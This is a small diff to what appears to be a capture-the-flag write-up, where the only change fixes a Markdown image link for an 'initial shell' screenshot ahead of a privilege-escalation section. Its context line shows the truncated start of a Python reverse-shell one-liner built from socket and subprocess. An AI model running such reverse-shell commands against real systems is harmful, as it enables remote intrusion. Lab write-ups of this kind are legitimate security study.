@@ -36,6 +36,6 @@ python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__
 ```
 
 and it worked: </br>
-[initial_shell](images/spectra/initial_shell.png) </br>
+![initial_shell](images/spectra/initial_shell.png) </br>
 
 # Privilege Escalation: 
